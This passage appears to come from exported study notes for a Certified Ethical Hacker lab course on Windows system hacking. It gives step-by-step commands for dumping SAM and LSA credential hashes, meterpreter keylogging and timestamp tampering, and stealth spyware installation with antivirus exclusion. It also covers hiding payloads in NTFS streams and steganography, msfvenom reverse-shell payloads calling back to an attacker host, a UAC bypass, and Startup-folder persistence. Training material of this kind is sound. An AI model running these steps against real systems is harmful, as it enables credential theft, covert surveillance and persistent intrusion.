kiwi</code></li></ul></li></ul><ul id="c15be156-0e3b-4b60-83f5-887689dfbbf0" class="bulleted-list"><li style="list-style-type:disc">Load NTLM hashes of all users<ul id="1ab6c329-36c0-468e-ae27-c30f2ab53bc3" class="bulleted-list"><li style="list-style-type:circle"><code>lsa_dump_sam</code></li></ul></li></ul><ul id="51f1fae2-4d08-466d-8cc2-b868fee8ce8e" class="bulleted-list"><li style="list-style-type:disc">View LSA Secrets Login hashes<ul id="9ca59a44-ef11-48c4-9cfa-f6245c7dd9a4" class="bulleted-list"><li style="list-style-type:circle"><code>lsa_dump_secrets</code></li></ul><ul id="5b745b62-cab7-4794-8e9b-8fb0415a891b" class="bulleted-list"><li style="list-style-type:circle">LSA secrets are used to manage a system&#x27;s local security policy,</li></ul><ul id="991973c2-970c-43ae-9a17-888569343a79" class="bulleted-list"><li style="list-style-type:circle">They contain sensitive data such as User passwords, IE passwords, service account passwords, SQL passwords etc.</li></ul></li></ul><ul id="cfbcce47-58c3-4dde-906c-86c1ccd91fd7" class="bulleted-list"><li style="list-style-type:disc">Change the password of Admin using password_change<ul id="3c6aac4e-09ef-452f-8e55-ed5d7fc2851b" class="bulleted-list"><li style="list-style-type:circle"><code><strong>password_change -u Admin -n [NTLM hash of Admin acquired in previous step] -P password</strong></code></li></ul><ul id="389b3cf3-d3bb-4ac4-809b-425f3c1dc638" class="bulleted-list"><li style="list-style-type:circle">If you run <code>lsa_dump_sam</code> again you can see the change</li></ul></li></ul></details></li></ul><p id="0f95dc56-cd02-4e47-af04-3c58728a6114" class="">
</p></details></li></ul><p id="8c9cdc61-d6f5-444a-81bf-d20fb9649923" class="">
</p></details></li></ul><ul id="4930e165-12ef-4187-a8d0-9c6f8b11cf52" class="toggle"><li><details open=""><summary>Post Exploitation</summary><ul id="8125e8de-567c-4b98-915f-8d1f02ab59c3" class="toggle"><li><details open=""><summary>Meterpreter Commands</summary><ul id="2751fdbb-d5eb-4bff-861b-37d8f6716dbf" class="bulleted-list"><li style="list-style-type:disc">idletime - amount of time user has been idle</li></ul><ul id="304fd727-6896-43d9-b77b-0f6bf18f61da" class="bulleted-list"><li style="list-style-type:disc">ipconfig</li></ul><ul id="9b36ee5a-8f4c-4b12-b1ea-69e9b535bb9c" class="bulleted-list"><li style="list-style-type:disc">getuid - shows current user</li></ul><ul id="71ab22fc-5214-49fc-9459-06ad32d8cbf8" class="bulleted-list"><li style="list-style-type:disc">sysinfo</li></ul><ul id="6774b9ca-562e-44e7-a844-f1cb1bc37511" class="bulleted-list"><li style="list-style-type:disc">pwd - current directory</li></ul><ul id="3d454067-9853-43b6-a729-092b2949fd53" class="bulleted-list"><li style="list-style-type:disc">ls</li></ul><ul id="8c3a9ed0-d18c-4cff-b519-032b8fa5d707" class="bulleted-list"><li style="list-style-type:disc">cat</li></ul><ul id="b539bbce-bd1a-451d-a0ff-711b5d23c35f" class="bulleted-list"><li style="list-style-type:disc">cd</li></ul><ul id="7ec0debc-6e6c-4134-b224-b2de95c0a8b5" class="bulleted-list"><li style="list-style-type:disc">shell</li></ul></details></li></ul><ul id="03c9275a-76af-484b-9609-553b60d7a9ef" class="toggle"><li><details open=""><summary>Leave no trace after accessing a file in meterpreter</summary><p id="2a8c32ac-16e4-49ab-995b-cf17210e9e3f" class="">By accessing a file, the last accessed or modified value is changed</p><p id="77d98458-4074-4e7c-8f0c-209efeb8685c" class="">These are called MACE attributes</p><p id="dc9f10eb-a1ce-4118-a74c-a72a8e5abf1e" class="">
</p><ul id="61d7ed8c-0bd0-407a-b026-224de38d7304" class="bulleted-list"><li style="list-style-type:disc">To see them: <code>timestomp &lt;file&gt; -v</code></li></ul><ul id="409d6995-9bfe-4296-8b57-87735f1520dd" class="bulleted-list"><li style="list-style-type:disc">To change the <strong>Modified </strong>value: <code>timestomp &lt;FILE&gt; -m &quot;02/11/2018 08:10:03&quot;</code> </li></ul><ul id="12e759f6-b7a8-4e6e-a5ae-2148a389e86b" class="bulleted-list"><li style="list-style-type:disc">Similarly you can change <strong>Accessed</strong> (<strong>-a</strong>), <strong>Created</strong> (<strong>-c</strong>), and <strong>Entry Modified</strong> (<strong>-e</strong>) values </li></ul><p id="c4497ec4-4d55-44c9-89d0-0d0c0c3e3d53" class="">
</p><p id="b56d9113-11ca-4b5a-afa9-5cc2ed78ec23" class="">
</p><p id="b466ceda-995b-4c40-b81a-0cce05d92760" class="">
</p></details></li></ul><ul id="7224f1a0-404a-4eac-b2f0-50d97d7e78c3" class="toggle"><li><details open=""><summary>Search for files in meterpreter</summary><ul id="a42a59e3-b9be-4c5a-aae2-b3a16b75a79a" class="bulleted-list"><li style="list-style-type:disc"><code>cd C:/</code></li></ul><ul id="95e71658-ee8c-4de5-8830-06c21b378900" class="bulleted-list"><li style="list-style-type:disc"><code>search -f &lt;filename.ext&gt;</code></li></ul></details></li></ul><ul id="5b5ae0ca-f847-4919-8cf5-d013876ec33d" class="toggle"><li><details open=""><summary>Keylogging in meterpreter</summary><ul id="aecc9854-d2ce-4dc1-9f3f-8b1811229f1c" class="bulleted-list"><li style="list-style-type:disc">To start <code>keyscan_start</code> </li></ul><ul id="746720ec-9cdb-403c-8e2e-ca0533aea84a" class="bulleted-list"><li style="list-style-type:disc">To dump <code>keyscan_dump</code><ul id="9260ce87-453a-4ea0-8309-db21da40bd2f" class="bulleted-list"><li style="list-style-type:circle">Each time it dumps the new strokes </li></ul><ul id="d2987e63-1747-4888-b3ff-ac32d9a77df9" class="bulleted-list"><li style="list-style-type:circle">and deletes the previous dump</li></ul></li></ul><p id="3d974f7c-3e72-49e5-b74c-0d85cca842a3" class="">
</p></details></li></ul><ul id="e92dfddd-c862-4bf7-9674-c4eb22563f71" class="toggle"><li><details open=""><summary>Things to do in shell</summary><p id="dc12d4c7-4b35-4009-89bf-5a491fb4cfb8" class="">Type <code>shell</code> to get in shell through meterpreter</p><ul id="6bb52a3e-d6ae-4d1d-8f2c-c974dded88c6" class="bulleted-list"><li style="list-style-type:disc"><code>dir /a:h</code> view hidden files</li></ul><ul id="6b7a9209-f67a-4bff-88ab-65fa285d6d3e" class="bulleted-list"><li style="list-style-type:disc"><code>sc queryex type=service state=all</code> list available services</li></ul><ul id="64fe348f-aef6-49e5-b175-ff1771019f51" class="bulleted-list"><li style="list-style-type:disc"><code>netsh firewall show state</code> display current firewall state</li></ul><ul id="e3a892a3-53d4-4536-bb84-5e3802dbe3f3" class="bulleted-list"><li style="list-style-type:disc"><code>netsh firewall show config</code> display firewall config</li></ul><ul id="39fa7603-0733-4f05-a1ab-883a938eb332" class="bulleted-list"><li style="list-style-type:disc"><code>wmic /node:&quot;&quot; product get name,version,vendor</code> view details of installed software</li></ul><ul id="e63cb855-ca8b-4d45-b0fc-1c84df8db58f" class="bulleted-list"><li style="list-style-type:disc"><code>wmic cpu get</code> get cpu info</li></ul><ul id="1ff379da-7eb8-4443-a3ad-65512e0c36d0" class="bulleted-list"><li style="list-style-type:disc"><code>wmic useraccount get name,sid</code> get login names and SIDs of users</li></ul><ul id="5fcdb41d-e8a3-4338-bcd0-88c256723f2b" class="bulleted-list"><li style="list-style-type:disc"><code>wmic os where Primary=&#x27;TRUE&#x27; reboot</code> reboot the system</li></ul><ul id="b26ee1be-c049-47a6-9781-c1fd92153bc4" class="toggle"><li><details open=""><summary>Others </summary><figure id="0ea8434d-6bb0-46fb-8efa-f3f66843520c" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2094.png"><img style="width:405.20001220703125px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2094.png"/></a></figure></details></li></ul></details></li></ul></details></li></ul><ul id="5bc978e4-c4cf-48bb-97a0-6d179921ba44" class="toggle"><li><details open=""><summary>Maintain Remote Access and Hide Malicious Activities</summary><ul id="2b3f0aba-4041-487e-8a35-a91c473b5c44" class="toggle"><li><details open=""><summary>Using PowerSpy and SpyAgent for monitoring target</summary><ul id="af1b09e9-bc33-4cc1-9b8e-8e1dd68f0d3d" class="toggle"><li><details open=""><summary>Using Power Spy</summary><p id="d6150a66-407a-4ba2-8e07-772d2023a773" class="">Power Spy is a computer activity monitoring software that allows you to secretly log all users on a PC while they are unaware.</p><p id="73bf2776-7c9e-412c-bbf2-accf5e65918e" class="">It is a product used by managers to monitor employees</p><p id="2b6a9dc7-d87d-4ec4-852d-10f054b3b91c" class="">Its a trial version</p><ul id="55623a07-6817-471f-b0b5-a83c73a4cc3f" class="toggle"><li><details open=""><summary>What you can do</summary><ul id="dce93e8b-83b2-47fe-b9d4-54abb8b3d8e5" class="bulleted-list"><li style="list-style-type:disc">Keystrokes</li></ul><ul id="9a2937cb-9b47-4bb9-b599-e90f0ca8679d" class="bulleted-list"><li style="list-style-type:disc">Apps Executed</li></ul><ul id="608d245d-898f-4cde-8ae7-6aa41161a9fe" class="bulleted-list"><li style="list-style-type:disc">Windows opened</li></ul><ul id="f1af1f49-50c0-46bd-acfc-c8a9ca481ceb" class="bulleted-list"><li style="list-style-type:disc">Screenshots</li></ul><ul id="f6143343-cc78-4f4b-bfdb-6718a722040e" class="bulleted-list"><li style="list-style-type:disc">Microphone</li></ul><ul id="63b9b743-2b61-4102-b8ce-6e9e1a370783" class="bulleted-list"><li style="list-style-type:disc">Documents</li></ul><ul id="8b32635c-51c2-4d00-b40f-90ea67690b1f" class="bulleted-list"><li style="list-style-type:disc">Clipboard</li></ul><figure id="ad1e2153-311e-406d-88e1-25202e72d36f" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2095.png"><img style="width:377.20001220703125px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2095.png"/></a></figure></details></li></ul><ul id="7fe8ddf1-c717-49af-b2a9-d32cb1ea7e3c" class="bulleted-list"><li style="list-style-type:disc">Install on target<ul id="24d38a6a-6e29-48ae-ade6-ffbdcba8d7e2" class="bulleted-list"><li style="list-style-type:circle">Has to be installed in GUI so remote desktop or local access is needed on target machine</li></ul><ul id="b73ae9b2-99a4-4286-8587-7fac02b20139" class="bulleted-list"><li style="list-style-type:circle">Copy setup.exe from <code><strong>Z:\CEHv12 Module 06 System Hacking\Spyware\General Spyware\Power Spy</strong></code><strong> </strong>to target machine</li></ul><ul id="fe161c1b-1a84-4ed1-9a4d-d1236df3a496" class="bulleted-list"><li style="list-style-type:circle">Install and set a password</li></ul><ul id="695f7d5d-a064-42c0-9b75-0ca8ed1c58a8" class="bulleted-list"><li style="list-style-type:circle">Click <code>Start monitoring</code> and <code>Stealth mode</code></li></ul></li></ul><ul id="0e947db1-1109-4f30-8b70-d25779542223" class="bulleted-list"><li style="list-style-type:disc">How to gain reports<ul id="53d4c0e6-dc97-4a45-ad9f-3ec42a47548b" class="bulleted-list"><li style="list-style-type:circle">You can either log in locally on target to see</li></ul><ul id="86b0389e-d67f-4d1c-9f46-2b351ed554c3" class="bulleted-list"><li style="list-style-type:circle">Or you can send reports to an ftp or an email address every x minutes</li></ul></li></ul><p id="87baa9f4-b996-4735-b797-7c2a89cbeaf9" class="">
</p><p id="4ccf0e47-e081-4cd5-a85e-42e7ab24ce3b" class="">
</p></details></li></ul><ul id="8910e967-b8ed-4197-9299-8aa52288c08a" class="toggle"><li><details open=""><summary>Using Spytech SpyAgent</summary><ul id="a3ecc447-bdd2-4336-b628-bf1d1e37a680" class="bulleted-list"><li style="list-style-type:disc">Installation<ul id="37d7cd91-60ca-47a4-a568-fc8ee523f61c" class="bulleted-list"><li style="list-style-type:circle">Can be found in <code><strong>Z:\CEHv12 Module 06 System Hacking\Spyware\General Spyware</strong></code></li></ul><ul id="75b8a645-ff29-41c2-b102-50b92ab7d57d" class="bulleted-list"><li style="list-style-type:circle">Has to be installed in GUI so remote desktop or local access is needed on target machine</li></ul><ul id="e4a28402-728b-494e-883a-4a4c427fc67b" class="bulleted-list"><li style="list-style-type:circle">Can be installed either as stealth mode or as admin mode</li></ul><ul id="67dcc5eb-5a2d-4677-b9f5-1695ae6bd57a" class="bulleted-list"><li style="list-style-type:circle">Needs to be excluded from antivirus because it can be detected due to monitoring user activity keystrokes etc.</li></ul><ul id="84e4d665-1858-4fbb-b7a9-d526cac1a307" class="bulleted-list"><li style="list-style-type:circle">It is a trials so it will periodically pop up Buy now even in stealth mode</li></ul><ul id="a88de387-1b1d-48af-91ea-cd73823dfc76" class="bulleted-list"><li style="list-style-type:circle">Needs a password to start</li></ul><ul id="f41aa902-0ab3-4252-b69c-9023c0907089" class="bulleted-list"><li style="list-style-type:circle">Click <code>Complete + Stealth Configuration</code></li></ul><ul id="bfabee52-63b0-4e0b-88df-c968a87e01cc" class="bulleted-list"><li style="list-style-type:circle">Click <code>Load on windows startup</code></li></ul><ul id="7d76bce6-42a0-49c2-a6da-8f6b611d9b96" class="bulleted-list"><li style="list-style-type:circle">Click on <code>stealth mode</code> to start</li></ul></li></ul><ul id="40eaefe1-b50e-4c6c-9a95-b0301ed8e7f6" class="bulleted-list"><li style="list-style-type:disc">What you can do<ul id="7a6464bc-f0b4-43d8-93d4-cd90213a163f" class="bulleted-list"><li style="list-style-type:circle">There is a cloud viewing option</li></ul><ul id="a3764932-bb12-429f-943a-0ac2d4636300" class="bulleted-list"><li style="list-style-type:circle">Email and FTP log delivery</li></ul><figure id="c2964bcf-5f8a-4d0c-bcb3-1734061f710b" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2096.png"><img style="width:377.20001220703125px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2096.png"/></a></figure></li></ul></details></li></ul><ul id="30ec5a8f-40c8-4568-a7a0-5d36aed499a6" class="toggle"><li><details open=""><summary>Other Tools</summary><ul id="a92644db-abd6-4afe-97ea-a5fa94ff9072" class="bulleted-list"><li style="list-style-type:disc"><strong>ACTIVTrak</strong> (activtrak.com)</li></ul><ul id="e4459bb3-97c1-4cf1-8300-e6f82cdef223" class="bulleted-list"><li style="list-style-type:disc"><strong>Veriato Cerebral</strong> (veriato.com)</li></ul><ul id="8b9e64f3-3095-4019-b4b4-4890a3e64370" class="bulleted-list"><li style="list-style-type:disc"><strong>NetVizor</strong> (netvizor.net)</li></ul><ul id="6f992212-7d5f-4569-9855-7f5983f54e0a" class="bulleted-list"><li style="list-style-type:disc"><strong>SoftActivity Monitor</strong> (softactivity.com)<br/><br/><br/></li></ul></details></li></ul></details></li></ul><ul id="eac8b5d3-ee61-4008-888b-3ac4cfbdee65" class="toggle"><li><details open=""><summary>Hide Files using NTFS Streams</summary><ul id="2de4480d-5a00-4add-8094-e3cd75cd7dfb" class="bulleted-list"><li style="list-style-type:disc">Make sure the file system of current folder is NTFS</li></ul><ul id="04455849-24ce-4d34-8bf6-17838b6d09d0" class="bulleted-list"><li style="list-style-type:disc">To move file1 into file2:<ul id="86aad15b-4828-4f8e-bcd1-176cd7a2bbc2" class="bulleted-list"><li style="list-style-type:circle"><code>type payload.exe &gt; readme.txt:payload.exe</code></li></ul></li></ul><ul id="9d9f9499-5d0a-4dd1-af55-144be9104724" class="bulleted-list"><li style="list-style-type:disc">Notice that readme.txt filesize does not change (use <code>dir</code>)</li></ul><ul id="8bbfeae8-018b-4100-94ab-7f38b72ebbfe" class="bulleted-list"><li style="list-style-type:disc">We can now delete payload.exe and it will still exist inside file2</li></ul><ul id="0fd14e7a-e5d4-494e-ad98-abeead1a3cef" class="bulleted-list"><li style="list-style-type:disc">To run payload.exe we can create a symbolic link to the file inside the NTFS stream and run it<ul id="03bd0500-e20b-489c-905b-cf7c4a5ce9e4" class="bulleted-list"><li style="list-style-type:circle"><code>mklink run.exe readme.txt:payload.exe</code></li></ul><ul id="94f48f47-6694-4794-ac65-bd26812f8ff9" class="bulleted-list"><li style="list-style-type:circle">run <code>run.exe</code></li></ul></li></ul></details></li></ul><ul id="fb196f34-82c4-4d1f-bb42-843ae02e8892" class="toggle"><li><details open=""><summary>Hide data using white space Steganography</summary><p id="f5795540-91e0-41b0-82b2-7df37294db32" class="">Whitespace steganography is used to conceal messages in ASCII text by adding white spaces to the end of the lines. </p><p id="e5f5f6d1-cd76-471e-ba2d-800fb12a927f" class="">Because spaces and tabs are generally not visible in text viewers</p><p id="381a60f4-44c1-4d3d-adbd-192db2c265e7" class="">
</p><ul id="54f859a9-1962-48fc-bf65-2748506c49e7" class="bulleted-list"><li style="list-style-type:disc">Snow can be found in <code><strong>E:\CEH-Tools\CEHv12 Module 06 System Hacking\Steganography Tools\Whitespace Steganography Tools\Snow</strong></code></li></ul><ul id="10d1eb37-b69b-4e9f-871c-c69e183710b6" class="bulleted-list"><li style="list-style-type:disc">Usage example:<ul id="ba82a46e-d475-461c-87b3-bb0771d626c3" class="bulleted-list"><li style="list-style-type:circle">Create a  <code>readme.txt</code> file with <code>Hell world</code> inside</li></ul><ul id="d93c337c-5ed5-4c0d-be0e-ced5d4f0ec5a" class="bulleted-list"><li style="list-style-type:circle">Save it in the <code>Snow</code> folder</li></ul><ul id="10c7237b-cbee-4271-9f22-0f146ceaabb8" class="bulleted-list"><li style="list-style-type:circle">Open cmd and type <code><strong>./snow.exe -C -m &quot;My swiss bank account number is 45656684512263&quot; -p &quot;magic&quot; readme.txt readme2.txt</strong></code><ul id="4af844b4-3c85-40c1-b045-4805e8c6ef67" class="bulleted-list"><li style="list-style-type:square"><code>magic</code> is the password</li></ul><ul id="711c1353-2132-4d58-9058-8fd82b1bcb42" class="bulleted-list"><li style="list-style-type:square"><code>readme2.txt</code> is a new file with steganography</li></ul><ul id="0bd3404f-b839-427f-b132-5a88411f2b46" class="bulleted-list"><li style="list-style-type:square"><code>-C</code> is for compression</li></ul><ul id="80dfcb9d-0f1c-4225-87e3-8b5511e60bdb" class="bulleted-list"><li style="list-style-type:square"><code>-m</code> is to indicate that its a message string for a text file</li></ul></li></ul><ul id="790eb166-01d9-4c61-9c66-aed9d4183d7a" class="bulleted-list"><li style="list-style-type:circle">Now that data is written inside <code>readme2.txt</code> file</li></ul></li></ul><ul id="eb39c1f9-f17d-42a6-baff-709f180c6375" class="bulleted-list"><li style="list-style-type:disc">Retrieve the data<ul id="61dfb565-a15f-4a4d-958e-22a56877c753" class="bulleted-list"><li style="list-style-type:circle"><code>snow -C -p &quot;magic&quot; readme2.txt</code></li></ul></li></ul></details></li></ul><ul id="e3f5090c-a4f6-45fd-a7d4-ddab545cef3f" class="toggle"><li><details open=""><summary>Image Steganography using OpenStego and StegOnline</summary><ul id="0c73fafe-ae92-433a-a2cc-8f2fdde2952a" class="toggle"><li><details open=""><summary>Using OpenStego</summary><p id="40629571-a3d5-4713-8e0a-c2ba109aee9a" class="">OpenStego is an image steganography tool that hides data inside images. </p><p id="da3ed3db-abaa-4845-a61b-b62208d6a730" class="">It is a Java-based application that supports password-based encryption of data for an additional layer of security. </p><p id="9d0d66a6-e576-4ff5-9264-4f2df0b47129" class="">It uses the DES algorithm for data encryption, in conjunction with MD5 hashing to derive the DES key from the provided password.</p><ul id="847209d8-0ff5-4a85-8ea0-b2825ed403a9" class="bulleted-list"><li style="list-style-type:disc">Hide data<ul id="33a830da-67bf-453a-b26e-b6141457b9c2" class="bulleted-list"><li style="list-style-type:circle">run <code>OpenStego</code></li></ul><ul id="2f6feaa8-b6a1-4599-b34e-b53e2df36efc" class="bulleted-list"><li style="list-style-type:circle"><code>Message File</code> is the message you want to hide and <code>Cover File</code> is the file you hide it in (eg. picture)</li></ul><ul id="0fe1a974-af55-4c2a-9bc4-f03631d7f6a5" class="bulleted-list"><li style="list-style-type:circle"><code>Output Stego File</code> is the resulting file, click the three dots (…) to decide where to save it</li></ul><ul id="30ec18f6-da5e-4794-b4b9-64f325949081" class="bulleted-list"><li style="list-style-type:circle">Set encryption type and password and click <code>Hide data</code></li></ul></li></ul><ul id="3e2fde3e-fd01-46b9-a4bc-767d682cda4d" class="bulleted-list"><li style="list-style-type:disc">Retrieve data<ul id="d212c4ab-0a32-4219-b7ce-79313d74174e" class="bulleted-list"><li style="list-style-type:circle">Select <code>Input stego file</code> and <code>Output folder</code> (dont write anything in the output)</li></ul><ul id="b20e0b7b-2a4e-4d7c-af20-71ec84c0cb46" class="bulleted-list"><li style="list-style-type:circle">Set password and click <code>Extract data</code> </li></ul><ul id="a4b4acc9-6a5f-4039-a6cd-e09db573ceee" class="bulleted-list"><li style="list-style-type:circle">The hidden file will be recovered in the specified output folder</li></ul></li></ul><ul id="eac10365-a250-4ec1-a4c7-cd6c38164221" class="bulleted-list"><li style="list-style-type:disc"></li></ul><p id="a5be1e7c-59f0-455f-8d37-dab1e5a4621c" class="">
</p></details></li></ul><ul id="f23fbceb-c419-4a79-8bdf-97bc6dda50a1" class="toggle"><li><details open=""><summary>Using StegOnline</summary><p id="6ab8726c-efb7-428c-940f-aca4fc9c458c" class="">StegOnline is a web-based, enhanced and open-source port of StegSolve. </p><p id="92bb71f9-4f02-422e-85c4-f5173a9304ad" class="">It can be used to browse through the 32 bit planes of the image, extract and embed data using LSB steganography techniques and hide images within other image bit planes.</p><ul id="b9d7f81c-2a32-4691-8f78-903ba04b317c" class="bulleted-list"><li style="list-style-type:disc">Hide file or text<ul id="ab401e27-4421-4bca-85b6-0101b82383e6" class="bulleted-list"><li style="list-style-type:circle">Go to <code><strong>https://stegonline.georgeom.net/upload</strong></code></li></ul><ul id="9e8f81c3-7452-43c7-94fd-710dde8b196b" class="bulleted-list"><li style="list-style-type:circle">Upload an Image</li></ul><ul id="c20358bd-823d-4489-a727-556702c4a42b" class="bulleted-list"><li style="list-style-type:circle">Click <code>Embed Files/Data</code></li></ul><ul id="b6ddd104-c7ee-4405-a991-a45704b56703" class="bulleted-list"><li style="list-style-type:circle">Select <code>R G and B</code> on row 5</li></ul><ul id="a0386992-da08-4853-9e77-553a741117a4" class="bulleted-list"><li style="list-style-type:circle">Type the text you want or the file you want to upload</li></ul><ul id="9c1d1ff1-b147-4da8-a8e1-d209d1dabcf7" class="bulleted-list"><li style="list-style-type:circle">Click <code>Download Extracted Data</code></li></ul></li></ul><ul id="4b057a3a-fcd1-409e-8acc-7fe6613f0135" class="bulleted-list"><li style="list-style-type:disc">Reveal file or text<ul id="5ed2bc6e-060c-44a6-b859-b3eb47af6c92" class="bulleted-list"><li style="list-style-type:circle">Go to <strong>https://stegonline.georgeom.net/upload</strong></li></ul><ul id="c3f557fd-26e7-4eb7-9f10-2bc864b55b04" class="bulleted-list"><li style="list-style-type:circle">Upload the image with embedded file/text</li></ul><ul id="68d4e641-6c4f-476e-871a-f37bdd051575" class="bulleted-list"><li style="list-style-type:circle">Click <code>Extract Files/Data</code></li></ul><ul id="0797364d-3114-48fa-814c-345a9812f528" class="bulleted-list"><li style="list-style-type:circle">Select <code>R G and B</code> on row 5</li></ul><ul id="a77fd24f-2ab6-4522-a9af-4df5ed09fa73" class="bulleted-list"><li style="list-style-type:circle">Click <code>Go</code></li></ul><ul id="e6ea7827-5694-4cea-a2e7-a8d6f21fbdeb" class="bulleted-list"><li style="list-style-type:circle">See text in ASCII form</li></ul></li></ul></details></li></ul><ul id="26d1d2e0-f2ab-434b-b78f-3b129250c3a3" class="toggle"><li><details open=""><summary>Other Tools</summary><ul id="2f205397-8f77-41eb-9cce-582a9bacf040" class="bulleted-list"><li style="list-style-type:disc"><strong>QuickStego</strong> (quickcrypto.com), </li></ul><ul id="9f0c02b3-2649-4f56-86d2-7e0595f5fc9c" class="bulleted-list"><li style="list-style-type:disc"><strong>SSuite Picsel</strong> (ssuitesoft.com)</li></ul><ul id="54631f38-0f06-4fec-adb9-2dfccd1be163" class="bulleted-list"><li style="list-style-type:disc"><strong>CryptaPix</strong> (briggsoft.com)</li></ul><ul id="c6bc7a62-6df7-420f-bf08-db00f3d651cd" class="bulleted-list"><li style="list-style-type:disc"><strong>gifshuffle</strong></li></ul></details></li></ul><p id="e8811bfc-04b0-4c4c-a5c8-673faef25305" class="">
</p></details></li></ul><ul id="fc087582-22a4-4cea-a793-6290cc6d67ac" class="toggle"><li><details open=""><summary>Maintain Persistence by Abusing Boot or Logon Autostart Execution</summary><ul id="fe863609-fafa-4e1c-9d2c-47035b3c5228" class="toggle"><li><details open=""><summary>Get a shell on the target</summary><ul id="8404f063-de22-4642-b36f-d09b6b907d9e" class="bulleted-list"><li style="list-style-type:disc"><code><strong>msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe &gt; /home/attacker/Desktop/exploit.exe</strong></code></li></ul><ul id="f8bd64fa-7d97-406f-9fe9-edf747b7fcea" class="bulleted-list"><li style="list-style-type:disc"><code>python -m http.server</code></li></ul><ul id="828830dc-73e3-4e5a-b70f-d7e2c5358291" class="bulleted-list"><li style="list-style-type:disc"><code>msfconsole</code></li></ul><ul id="2e736caf-cc45-4d38-a026-c42751536199" class="bulleted-list"><li style="list-style-type:disc"><code><strong>use exploit/multi/handler</strong></code></li></ul><ul id="7fa09431-6a9b-4c45-a3b1-2226eaafefd7" class="bulleted-list"><li style="list-style-type:disc"><code><strong>set payload windows/meterpreter/reverse_tcp</strong></code></li></ul><ul id="a604c78f-3024-49bc-b652-2643dbc5c885" class="bulleted-list"><li style="list-style-type:disc"><code>set lhost</code></li></ul><ul id="3f47c79e-7f8c-42f3-94c2-21545bbb0e4c" class="bulleted-list"><li style="list-style-type:disc"><code>set lport</code></li></ul><ul id="9bfc318d-f8a6-4cbd-9a2d-9eba48713335" class="bulleted-list"><li style="list-style-type:disc"><code>run</code></li></ul><ul id="7b8e6dcf-4daa-420a-850c-840644da84c8" class="bulleted-list"><li style="list-style-type:disc">Download and run exploit from target machine using the http server</li></ul></details></li></ul><ul id="11370b60-5280-4589-9681-d433aed48c22" class="toggle"><li><details open=""><summary>Elevate privileges</summary><ul id="2344391c-49a2-4647-ae5e-24dea824b038" class="bulleted-list"><li style="list-style-type:disc"><code>bacgkround</code> the session</li></ul><ul id="8241a3fd-2bd0-4ceb-908c-1155cb98df3d" class="bulleted-list"><li style="list-style-type:disc"><code><strong>use exploit/windows/local/bypassuac_fodhelper</strong></code></li></ul><ul id="343e0a77-2218-4685-8cbf-ffb228ec4117" class="bulleted-list"><li style="list-style-type:disc"><code>set session 1</code></li></ul><ul id="a9bb3401-bb6c-4d9f-97c0-a00d19a6d36e" class="bulleted-list"><li style="list-style-type:disc"><code>set lhost</code></li></ul><ul id="c1fd5a86-4fd1-44f4-acc7-f1c2598fee3a" class="bulleted-list"><li style="list-style-type:disc"><code>set lport</code></li></ul><ul id="c5a75dd5-4096-4b8a-aef0-96016847412d" class="bulleted-list"><li style="list-style-type:disc"><code>set target 0</code></li></ul><ul id="d0681bd8-2093-4cf2-abc7-f4c2d179fbae" class="bulleted-list"><li style="list-style-type:disc"><code>exploit</code></li></ul><ul id="c62cca28-3376-4c5c-9e3f-45a740d8434b" class="bulleted-list"><li style="list-style-type:disc"><code>getsystem -t 1</code> on the new session that was created</li></ul><ul id="14723511-e636-46d1-83a8-74c5f426a9e2" class="bulleted-list"><li style="list-style-type:disc">Confirm NT SYSTEM by running <code>getuid</code></li></ul></details></li></ul><ul id="aa2f0687-7c28-4af1-a79e-e37ce16355d3" class="toggle"><li><details open=""><summary>Use startup folder to autostart</summary><ul id="d4b971b3-d4f8-42a2-b78d-5823402bd05b" class="bulleted-list"><li style="list-style-type:disc">In the meterpreter shell, type <code><strong>cd “C:\\ProgramData\\Start Menu\\Programs\\Startup”</strong></code></li></ul><ul id="c110ea81-55ca-4566-9f40-1899c62b499c" class="bulleted-list"><li style="list-style-type:disc">Confirm the directory <code>pwd</code></li></ul><ul id="6969b9c8-7dd3-4d6c-9f0a-af0cc0cf96ef" class="bulleted-list"><li style="list-style-type:disc">We need to upload a payload here<ul id="d4e9f450-fab7-4d73-9a35-9da5d3f98988" class="bulleted-list"><li style="list-style-type:circle">Load another parrot shell</li></ul><ul id="218be06c-1f84-4d8d-8664-cad90c49ae3d" class="bulleted-list"><li style="list-style-type:circle">Type <code><strong>msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=8080 -f exe &gt; payload.exe</strong></code></li></ul><ul id="5817379d-0348-4110-971f-967c5fb783b2" class="bulleted-list"><li style="list-style-type:circle">In the meterpreter shell now type <code><strong>upload /home/attacker/payload.exe</strong></code></li></ul></li></ul><ul id="a518cd2d-863b-4577-8e05-c7c94151cbcd" class="bulleted-list"><li style="list-style-type:disc">Capture the session<ul id="0618043a-6493-4085-9906-191b0193588d" class="bulleted-list"><li style="list-style-type:circle"><code>bacgkround</code> current session</li></ul><ul id="68a3e2ac-3886-4f52-941b-f791e73f545a" class="bulleted-list"><li style="list-style-type:circle"><code>use multi/handler</code> </li></ul><ul id="db780c6e-1e62-4975-9a21-94ca945bc559" class="bulleted-list"><li style="list-style-type:circle"><code>set lport 8080</code></li></ul><ul id="c6cc8489-ebae-4eb4-a00c-89813d909244" class="bulleted-list"><li style="list-style-type:circle"><code>run</code></li></ul><ul id="d00e7dac-cd73-4f92-8697-d72b5a06ec95" class="bulleted-list"><li style="list-style-type:circle">Restart windows target machine</li></ul><ul id="466d08b1-756a-4f52-a051-c63769cdaed8" class="bulleted-list"><li style="list-style-type:circle">A session should pop up on boot</li></ul></li></ul></details></li></ul></details></li></ul><ul id="da5542b4-da70-4183-82a3-95288cdd8c95" class="toggle"><li><details open=""><summary>Maintain Domain Persistence by Exploiting Active Directory Objects</summary><ul id="35869506-6f6a-4074-adf6-e8e468b0a3ba" 